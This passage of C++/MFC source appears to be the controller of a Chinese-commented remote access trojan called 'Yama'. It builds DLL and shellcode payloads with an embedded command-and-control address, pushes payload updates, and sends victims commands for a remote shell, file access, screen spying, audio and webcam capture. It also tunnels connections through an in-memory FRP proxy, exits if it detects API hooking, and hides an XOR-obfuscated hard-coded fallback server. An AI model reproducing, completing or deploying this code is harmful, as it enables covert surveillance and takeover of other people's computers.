		int padding = align ? ALIGN16(finalSize) - finalSize : 0;
		compressedBuffer = new BYTE[finalSize + padding];
		memset(compressedBuffer + finalSize, 0, padding);
		ulTotalSize = finalSize;

		memcpy(compressedBuffer, finalShellcode, finalSize);
		free(finalShellcode);

		return true;
	}
	return false;
}

Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="") {
	BYTE* szBuffer = NULL;
	int dwFileSize = 0;

	// 查找名为 MY_BINARY_FILE 的 BINARY 类型资源
	auto id = is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86;
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
	if (hResource == NULL) {
		return NULL;
	}
	// 获取资源的大小
	DWORD dwSize = SizeofResource(NULL, hResource);

	// 加载资源
	HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
	if (hLoadedResource == NULL) {
		return NULL;
	}
	// 锁定资源并获取指向资源数据的指针
	LPVOID pData = LockResource(hLoadedResource);
	if (pData == NULL) {
		return NULL;
	}
	LPBYTE srcData = (LPBYTE)pData;
	int srcLen = dwSize;
	if (!isDLL) { // Convert DLL -> Shell code.
		if (!MakeShellcode(srcData, srcLen, (LPBYTE)pData, dwSize)) {
			Mprintf("MakeShellcode failed \n");
			return false;
		}
	}
	dwFileSize = srcLen;
	int bufSize = sizeof(int) + dwFileSize + 2;
	int padding = ALIGN16(bufSize) - bufSize;
	szBuffer = new BYTE[bufSize + padding];
	szBuffer[0] = CMD_DLLDATA;
	szBuffer[1] = isDLL ? MEMORYDLL : SHELLCODE;
	memcpy(szBuffer + 2, &dwFileSize, sizeof(int));
	memcpy(szBuffer + 2 + sizeof(int), srcData, dwFileSize);
	memset(szBuffer + 2 + sizeof(int) + dwFileSize, 0, padding);
	// CMD_DLLDATA + SHELLCODE + dwFileSize + pData
	auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
	std::string s(skCrypt(FLAG_FINDEN)), ip, port;
	int offset = MemoryFind((char*)szBuffer, s.c_str(), dwFileSize, s.length());
	if (offset != -1) {
		CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(szBuffer + offset);
		if (!addr.empty()) {
			splitIpPort(addr, ip, port);
			server->SetServer(ip.c_str(), atoi(port.c_str()));
			server->SetAdminId(GetMasterHash().c_str());
		}
		if (g_2015RemoteDlg->m_superID % 313 == 0)
		{
			server->iHeaderEnc = PROTOCOL_HELL;
			// TODO: UDP 协议不稳定
			server->protoType = PROTO_TCP;
		}
		server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
		memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
	}
	auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
	delete[] szBuffer;
	if (srcData != pData) 
		SAFE_DELETE_ARRAY(srcData);
	return ret;
}

bool IsAddressInSystemModule(void* addr, const std::string& expectedModuleName)
{
	MEMORY_BASIC_INFORMATION mbi = {};
	if (VirtualQuery(addr, &mbi, sizeof(mbi)) == 0)
		return false;

	char modPath[MAX_PATH] = {};
	if (GetModuleFileNameA((HMODULE)mbi.AllocationBase, modPath, MAX_PATH) == 0)
		return false;

	std::string path = modPath;

	// 合法跳转：仍在指定模块或 system32 下
	return (path.find(expectedModuleName) != std::string::npos ||
		path.find("System32") != std::string::npos ||
		path.find("SysWOW64") != std::string::npos);
}

bool IsFunctionReallyHooked(const char* dllName, const char* funcName)
{
	HMODULE hMod = GetModuleHandleA(dllName);
	if (!hMod) return true;

	FARPROC pFunc = GetProcAddress(hMod, funcName);
	if (!pFunc) return true;

	BYTE* p = (BYTE*)pFunc;

#ifdef _WIN64
	// 64 位：检测 FF 25 xx xx xx xx => JMP [RIP+rel32]
	if (p[0] == 0xFF && p[1] == 0x25)
	{
		INT32 relOffset = *(INT32*)(p + 2);
		uintptr_t* pJumpPtr = (uintptr_t*)(p + 6 + relOffset);

		if (!IsBadReadPtr(pJumpPtr, sizeof(void*)))
		{
			void* realTarget = (void*)(*pJumpPtr);
			if (!IsAddressInSystemModule(realTarget, dllName))
				return true; // 跳到未知模块，可能是 Hook
		}
	}

	// JMP rel32 (E9)
	if (p[0] == 0xE9)
	{
		INT32 rel = *(INT32*)(p + 1);
		void* target = (void*)(p + 5 + rel);
		if (!IsAddressInSystemModule(target, dllName))
			return true;
	}

#else
	// 32 位：检测 FF 25 xx xx xx xx => JMP [abs addr]
	if (p[0] == 0xFF && p[1] == 0x25)
	{
		uintptr_t* pJumpPtr = *(uintptr_t**)(p + 2);
		if (!IsBadReadPtr(pJumpPtr, sizeof(void*)))
		{
			void* target = (void*)(*pJumpPtr);
			if (!IsAddressInSystemModule(target, dllName))
				return true;
		}
	}

	// JMP rel32
	if (p[0] == 0xE9)
	{
		INT32 rel = *(INT32*)(p + 1);
		void* target = (void*)(p + 5 + rel);
		if (!IsAddressInSystemModule(target, dllName))
			return true;
	}
#endif

	// 检测 PUSH addr; RET
	if (p[0] == 0x68 && p[5] == 0xC3)
	{
		void* target = *(void**)(p + 1);
		if (!IsAddressInSystemModule(target, dllName))
			return true;
	}

	return false; // 未发现 Hook
}

BOOL CMy2015RemoteDlg::OnInitDialog()
{
	AUTO_TICK(500);
	CDialogEx::OnInitDialog();

	// Grid 容器
	int size = THIS_CFG.GetInt("settings", "VideoWallSize");
	size = max(size, 1);
	if (size > 1) {
		m_gridDlg = new CGridDialog();
		m_gridDlg->Create(IDD_GRID_DIALOG, GetDesktopWindow());
		m_gridDlg->ShowWindow(SW_HIDE);
		m_gridDlg->SetGrid(size, size);
	}

	if (!IsPwdHashValid()) {
		THIS_CFG.SetStr("settings", "superAdmin", "");
		THIS_CFG.SetStr("settings", "Password", "");
		THIS_CFG.SetInt("settings", "MaxConnection", 2);
		THIS_APP->UpdateMaxConnection(2);
	}
	if (GetPwdHash() == GetMasterHash()) {
		auto pass = THIS_CFG.GetStr("settings", "superAdmin");
		if (hashSHA256(pass) == GetPwdHash()) {
			m_superPass = pass;
		} else {
			THIS_CFG.SetStr("settings", "superAdmin", "");
		}
	}

	// 将“关于...”菜单项添加到系统菜单中。
	SetWindowText(_T("Yama"));
	LoadFromFile(m_ClientMap, GetDbPath());

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	// 主控程序公网IP
	std::string ip = THIS_CFG.GetStr("settings", "master", "");
	int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
	std::string master = ip.empty() ? "" : ip + ":" + std::to_string(port);
	const Validation* v = GetValidation();
	if (!(strlen(v->Admin) && v->Port > 0)) {
		// IMPORTANT: For authorization only.
		PrintableXORCipher cipher;
		char buf1[] = { "ld{ll{dc`{geb" }, buf2[] = {"b`af"};
		cipher.process(buf1, strlen(buf1));
		cipher.process(buf2, strlen(buf2));
		static Validation test(99999, buf1, atoi(buf2));
		v = &test;
	}
	if (strlen(v->Admin) && v->Port > 0) {
		DWORD size = 0;
		LPBYTE data = ReadResource(sizeof(void*) == 8 ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86, size);
		if (data) {
			int offset = MemoryFind((char*)data, FLAG_FINDEN, size, strlen(FLAG_FINDEN));
			if (offset != -1) {
				CONNECT_ADDRESS* p = (CONNECT_ADDRESS*)(data + offset);
				p->SetServer(v->Admin, v->Port);
				p->SetAdminId(GetMasterHash().c_str());
				p->iType = CLIENT_TYPE_MEMDLL;
				p->parentHwnd = (uint64_t)GetSafeHwnd();
				memcpy(p->pwdHash, GetPwdHash().c_str(), 64);
				m_tinyDLL = MemoryLoadLibrary(data, size);
			}
			SAFE_DELETE_ARRAY(data);
		}
	}
	g_2015RemoteDlg = this;
	m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master);
	m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true, true, master);
	m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false, master);
	m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false, master);

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	isClosed = FALSE;

	CreateToolBar();
	InitControl();

	CreatStatusBar();

	CreateNotifyBar();

	CreateSolidMenu();

	std::string nPort = THIS_CFG.GetStr("settings", "ghost", "6543");
	m_nMaxConnection = 2;
	std::string pwd = THIS_CFG.GetStr("settings", "Password");
	auto arr = StringToVector(pwd, '-', 6);
	if (arr.size() == 7) {
		m_nMaxConnection = atoi(arr[2].c_str());
	}
	else {
		int nMaxConnection = THIS_CFG.GetInt("settings", "MaxConnection");
		m_nMaxConnection = nMaxConnection <= 0 ? 10000 : nMaxConnection;
	}
	const std::string method = THIS_CFG.GetStr("settings", "UDPOption", "0");
	int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
	int usingFRP = master.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
	m_settings = { m, sizeof(void*) == 8, __DATE__, n, usingFRP };
	auto w = THIS_CFG.GetStr("settings", "wallet", "");
	memcpy(m_settings.WalletAddress, w.c_str(), w.length());
	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
	std::string str = myMap[n];
	LVCOLUMN lvColumn;
	memset(&lvColumn, 0, sizeof(LVCOLUMN));
	lvColumn.mask = LVCF_TEXT;
	lvColumn.pszText = (char*)str.data();
	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
	timeBeginPeriod(1);
	if (IsFunctionReallyHooked("user32.dll","SetTimer") || IsFunctionReallyHooked("user32.dll", "KillTimer")) {
		MessageBoxA("FUCK!!! 请勿HOOK此程序!", "提示", MB_ICONERROR);
		ExitProcess(-1);
		return FALSE;
	}
	int tm = THIS_CFG.GetInt("settings", "Notify", 10);
	tm = min(tm, 10);
#ifdef _DEBUG
	SetTimer(TIMER_CHECK, max(1, tm) * 1000, NULL);
#else
	SetTimer(TIMER_CHECK, max(1, tm) * 60 * 1000, NULL);
#endif

	m_hFRPThread = CreateThread(NULL, 0, StartFrpClient, this, NULL, NULL);

	// 最后启动SOCKET
	if (!Activate(nPort, m_nMaxConnection, method)) {
		OnCancel();
		return FALSE;
	}
	THIS_CFG.SetStr("settings", "MainWnd", std::to_string((uint64_t)GetSafeHwnd()));

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

DWORD WINAPI CMy2015RemoteDlg::StartFrpClient(LPVOID param){
	CMy2015RemoteDlg* This = (CMy2015RemoteDlg*)param;
	IPConverter cvt;
	std::string ip = THIS_CFG.GetStr("settings", "master", "");
	CString tip = !ip.empty() && ip != cvt.getPublicIP() ?
		CString(ip.c_str()) + " 必须是\"公网IP\"或反向代理服务器IP" :
		"请设置\"公网IP\"，或使用反向代理服务器的IP";
	This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CString(tip), NULL);
	int usingFRP = 0;
#ifdef _WIN64
	usingFRP = ip.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
#endif
	if (!usingFRP) {
		CloseHandle(This->m_hFRPThread);
		This->m_hFRPThread = NULL;
		return 0x20250820;
	}

	Mprintf("[FRP] Proxy thread start running\n");

	do 
	{
		DWORD size = 0;
		LPBYTE frpc = ReadResource(IDR_BINARY_FRPC, size);
		if (frpc == nullptr) {
			Mprintf("Failed to read FRP DLL\n");
			break;
		}
		HMEMORYMODULE hDLL = MemoryLoadLibrary(frpc, size);
		SAFE_DELETE_ARRAY(frpc);
		if (hDLL == NULL) {
			Mprintf("Failed to load FRP DLL\n");
			break;
		}
		typedef int (*Run)(char* cstr, int* ptr);
		Run run = (Run)MemoryGetProcAddress(hDLL, "Run");
		if (!run) {
			Mprintf("Failed to get FRP function\n");
			MemoryFreeLibrary(hDLL);
			break;
		}
		std::string s = GetFrpSettingsPath();
		int n = run((char*)s.c_str(), &(This->m_frpStatus));
		if (n) {
			Mprintf("Failed to run FRP function\n");
			This->PostMessage(WM_SHOWERRORMSG,(WPARAM)new CString("反向代理: 公网IP和代理设置是否正确? FRP 服务端是否运行?"));
		}
		// Free FRP DLL will cause crash
		// Do NOT use MemoryFreeLibrary and 528 bytes memory leak detected when exiting master
		// MemoryFreeLibrary(hDLL);
	} while (false);

	CloseHandle(This->m_hFRPThread);
	This->m_hFRPThread = NULL;
	Mprintf("[FRP] Proxy thread stop running\n");

	return 0x20250731;
}

void CMy2015RemoteDlg::ApplyFrpSettings() {
	auto master = THIS_CFG.GetStr("settings", "master");
	if (master.empty()) return;

	config cfg(GetFrpSettingsPath());
	cfg.SetStr("common", "server_addr", master);
	cfg.SetInt("common", "server_port", THIS_CFG.GetInt("frp", "server_port", 7000));
	cfg.SetStr("common", "token", THIS_CFG.GetStr("frp", "token"));
	cfg.SetStr("common", "log_file", THIS_CFG.GetStr("frp", "log_file", "./frpc.log"));

	auto ports = THIS_CFG.GetStr("settings", "ghost", "6543");
	auto arr = StringToVector(ports, ';');
	for (int i = 0; i < arr.size(); ++i) {
		auto tcp = "YAMA-TCP-" + arr[i];
		cfg.SetStr(tcp, "type", "tcp");
		cfg.SetStr(tcp, "local_port", arr[i]);
		cfg.SetStr(tcp, "remote_port", arr[i]);

		auto udp = "YAMA-UDP-" + arr[i];
		cfg.SetStr(udp, "type", "udp");
		cfg.SetStr(udp, "local_port", arr[i]);
		cfg.SetStr(udp, "remote_port", arr[i]);
	}
}

void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMy2015RemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMy2015RemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (SIZE_MINIMIZED==nType)
	{
		return;
	} 
	EnterCriticalSection(&m_cs);
	if (m_CList_Online.m_hWnd!=NULL)   //（控件也是窗口因此也有句柄）
	{
		CRect rc;
		rc.left = 1;          //列表的左坐标     
		rc.top  = 80;         //列表的上坐标
		rc.right  =  cx-1;    //列表的右坐标
		rc.bottom = cy-160;   //列表的下坐标
		m_CList_Online.MoveWindow(rc);

		for(int i=0;i<g_Column_Count_Online;++i){           //遍历每一个列
			double Temp=g_Column_Data_Online[i].nWidth;     //得到当前列的宽度   138
			Temp/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                               //转换为int 类型
			m_CList_Online.SetColumnWidth(i,(lenth));       //设置当前的宽度
		}
	}
	LeaveCriticalSection(&m_cs);

	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = cy-156;     //列表的上坐标
		rc.right  = cx-1;    //列表的右坐标
		rc.bottom = cy-20;   //列表的下坐标
		m_CList_Message.MoveWindow(rc);
		for(int i=0;i<g_Column_Count_Message;++i){           //遍历每一个列
			double Temp=g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
			Temp/=g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=Temp;                                  //转换为int 类型
			m_CList_Message.SetColumnWidth(i,(lenth));        //设置当前的宽度
		}
	}

	if(m_StatusBar.m_hWnd!=NULL){    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.top=cy-20;
		Rect.left=0;
		Rect.right=cx;
		Rect.bottom=cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}

	if(m_ToolBar.m_hWnd!=NULL)                  //工具条
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
	}
}

LRESULT CMy2015RemoteDlg::OnPasswordCheck(WPARAM wParam, LPARAM lParam) {
	static bool isChecking = false;
	if (isChecking) 
		return S_OK;

	isChecking = true;
	if (!CheckValid(-1))
	{
		KillTimer(TIMER_CHECK);
		m_nMaxConnection = 2;
		THIS_APP->UpdateMaxConnection(m_nMaxConnection);
		int tm = THIS_CFG.GetInt("settings", "Notify", 10);
		THIS_CFG.SetInt("settings", "Notify", tm - 1);
	}
	isChecking = false;
	return S_OK;
}

void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
	if (nIDEvent == TIMER_CHECK)
	{
		static int count = 0;
		static std::string eventName = EventName();
		HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, eventName.c_str());
		if (hEvent) {
			CloseHandle(hEvent);
		}else if (++count == 10) {
			THIS_APP->UpdateMaxConnection(count);
		}
		if (!m_superPass.empty()) {
			Mprintf(">>> Timer is killed <<<\n");
			KillTimer(nIDEvent);
			std::string masterHash = GetMasterHash();
			if (GetPwdHash() == masterHash) {
				THIS_CFG.SetStr("settings", "superAdmin", m_superPass);
				THIS_CFG.SetStr("settings", "HMAC", genHMAC(masterHash, m_superPass));
			}
			return;
		}
		PostMessageA(WM_PASSWORDCHECK);
	}
	if (nIDEvent == TIMER_CLOSEWND) {
		DeletePopupWindow();
	}

	CDialogEx::OnTimer(nIDEvent);
}


void CMy2015RemoteDlg::DeletePopupWindow() {
	if (m_pFloatingTip)
	{
		if (::IsWindow(m_pFloatingTip->GetSafeHwnd()))
			m_pFloatingTip->DestroyWindow();
		SAFE_DELETE(m_pFloatingTip);
	}
	KillTimer(TIMER_CLOSEWND);
}


void CMy2015RemoteDlg::OnClose()
{
	// 隐藏窗口而不是关闭
	ShowWindow(SW_HIDE);
	Mprintf("======> Hide\n");
}

void CMy2015RemoteDlg::Release(){
	Mprintf("======> Release\n");
	DeletePopupWindow();
	isClosed = TRUE;
	m_frpStatus = STATUS_EXIT;
	ShowWindow(SW_HIDE);

	Shell_NotifyIcon(NIM_DELETE, &m_Nid);

	BYTE bToken = CLIENT_EXIT_WITH_SERVER ? COMMAND_BYE : SERVER_EXIT;
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetItemCount();
	for(int Pos = 0; Pos < n; ++Pos) 
	{
		context* ContextObject = (context*)m_CList_Online.GetItemData(Pos);
		ContextObject->Send2Client( &bToken, sizeof(BYTE));
		ContextObject->Destroy();
	}
	LeaveCriticalSection(&m_cs);
	Sleep(500);
	while (m_hFRPThread)
		Sleep(20);

	THIS_APP->Destroy();
	SAFE_DELETE(m_gridDlg);
	g_2015RemoteDlg = NULL;
	SetEvent(m_hExit);
	CloseHandle(m_hExit);
	m_hExit = NULL;
	Sleep(500);

	timeEndPeriod(1);
}

int CALLBACK CMy2015RemoteDlg::CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort) {
	auto* pSortInfo = reinterpret_cast<std::pair<int, bool>*>(lParamSort);
	int nColumn = pSortInfo->first;
	bool bAscending = pSortInfo->second;

	// 获取列值
	CONTEXT_OBJECT* context1 = (CONTEXT_OBJECT*)lParam1;
	CONTEXT_OBJECT* context2 = (CONTEXT_OBJECT*)lParam2;
	CString s1 = context1->GetClientData(nColumn);
	CString s2 = context2->GetClientData(nColumn);

	int result = s1 > s2 ? 1 : -1;
	return bAscending ? result : -result;
}

void CMy2015RemoteDlg::SortByColumn(int nColumn) {
	static int m_nSortColumn = 0;
	static bool m_bSortAscending = false;
	if (nColumn == m_nSortColumn) {
		// 如果点击的是同一列，切换排序顺序
		m_bSortAscending = !m_bSortAscending;
	}
	else {
		// 否则，切换到新列并设置为升序
		m_nSortColumn = nColumn;
		m_bSortAscending = true;
	}

	// 创建排序信息
	std::pair<int, bool> sortInfo(m_nSortColumn, m_bSortAscending);
	EnterCriticalSection(&m_cs);
	m_CList_Online.SortItems(CompareFunction, reinterpret_cast<LPARAM>(&sortInfo));
	LeaveCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult) {
	LPNMHEADER pNMHeader = reinterpret_cast<LPNMHEADER>(pNMHDR);
	int nColumn = pNMHeader->iItem; // 获取点击的列索引
	SortByColumn(nColumn);          // 调用排序函数
	*pResult = 0;
}


void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	//弹出菜单

	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //加载菜单资源   资源和类对象关联

	CMenu* SubMenu = Menu.GetSubMenu(0);

	CPoint	Point;
	GetCursorPos(&Point);

	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_UPDATE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[2], &m_bmOnline[2]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_SHARE, MF_BYCOMMAND, &m_bmOnline[3], &m_bmOnline[3]);
	Menu.SetMenuItemBitmaps(ID_MAIN_PROXY, MF_BYCOMMAND, &m_bmOnline[4], &m_bmOnline[4]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_HOSTNOTE, MF_BYCOMMAND, &m_bmOnline[5], &m_bmOnline[5]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_VIRTUAL_DESKTOP, MF_BYCOMMAND, &m_bmOnline[6], &m_bmOnline[6]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_GRAY_DESKTOP, MF_BYCOMMAND, &m_bmOnline[7], &m_bmOnline[7]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_REMOTE_DESKTOP, MF_BYCOMMAND, &m_bmOnline[8], &m_bmOnline[8]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND, &m_bmOnline[9], &m_bmOnline[9]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND, &m_bmOnline[10], &m_bmOnline[10]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND, &m_bmOnline[11], &m_bmOnline[11]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_ASSIGN_TO, MF_BYCOMMAND, &m_bmOnline[12], &m_bmOnline[12]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_ADD_WATCH, MF_BYCOMMAND, &m_bmOnline[13], &m_bmOnline[13]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND, &m_bmOnline[14], &m_bmOnline[14]);

	std::string masterHash(GetMasterHash());
	if (GetPwdHash() != masterHash || m_superPass.empty()) {
		Menu.DeleteMenu(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND);
		Menu.DeleteMenu(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND);
	}

	// 创建一个新的子菜单
	CMenu newMenu;
	if (!newMenu.CreatePopupMenu()) {
		MessageBox(_T("创建分享主机的子菜单失败!"), "提示");
		return;
	}

	int i = 0;
	for (const auto& s : m_DllList) {
		// 向子菜单中添加菜单项
		newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE + i++, s->Name.c_str());
	}
	if (i == 0){
		newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE, "操作指导");
	}
	// 将子菜单添加到主菜单中
	SubMenu->AppendMenuA(MF_STRING | MF_POPUP, (UINT_PTR)newMenu.Detach(), _T("执行代码"));

	int	iCount = SubMenu->GetMenuItemCount();
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetSelectedCount();
	LeaveCriticalSection(&m_cs);
	if (n == 0)         //如果没有选中
	{
		for (int i = 0; i < iCount; ++i)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}
	}
	else if (GetPwdHash() != GetMasterHash()) {
		SubMenu->EnableMenuItem(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		SubMenu->EnableMenuItem(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}

	// 刷新菜单显示
	DrawMenuBar();
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);

	*pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineMessage()
{
	BYTE bToken = COMMAND_TALK;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

void CMy2015RemoteDlg::OnOnlineUpdate()
{
	if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"), 
		_T("提示"), MB_ICONQUESTION | MB_YESNO))
		return;

	Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
	ULONGLONG fileSize = buf->length(true) - 6;
	PBYTE buffer = new BYTE[fileSize + 9];
	if (buffer) {
		buffer[0] = COMMAND_UPDATE;
		memcpy(buffer + 1, &fileSize, 8);
		memcpy(buffer + 9, buf->c_str() + 6, fileSize);
		SendSelectedCommand((PBYTE)buffer, 9 + fileSize);
		delete[] buffer;
	}
}

void CMy2015RemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码
	if (IDYES != MessageBox(_T("确定删除选定的被控计算机吗?"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
		return;

	BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

	EnterCriticalSection(&m_cs);
	int iCount = m_CList_Online.GetSelectedCount();
	for (int i=0;i<iCount;++i)
	{
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);
		context* ctx = (context*)m_CList_Online.GetItemData(iItem);
		m_CList_Online.DeleteItem(iItem);
		ctx->Destroy();
		strIP+="断开连接";
		ShowMessage("操作成功",strIP);
	}
	LeaveCriticalSection(&m_cs);
}

VOID CMy2015RemoteDlg::OnOnlineCmdManager()
{
	BYTE	bToken = COMMAND_SHELL;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineProcessManager()
{
	BYTE	bToken = COMMAND_SYSTEM;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}

VOID CMy2015RemoteDlg::OnOnlineWindowManager()
{
	BYTE	bToken = COMMAND_WSLIST;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
{
	int n = THIS_CFG.GetInt("settings", "DXGI");
	BOOL all = THIS_CFG.GetInt("settings", "MultiScreen");
	CString algo = THIS_CFG.GetStr("settings", "ScreenCompress", "").c_str();
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, n, algo.IsEmpty() ? ALGORITHM_DIFF : atoi(algo.GetString()), all};
	SendSelectedCommand(bToken, sizeof(bToken));
}

VOID CMy2015RemoteDlg::OnOnlineFileManager()
{
	BYTE	bToken = COMMAND_LIST_DRIVE;    
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineAudioManager()
{
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineVideoManager()
{
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineServerManager()
{
	BYTE	bToken = COMMAND_SERVICES;
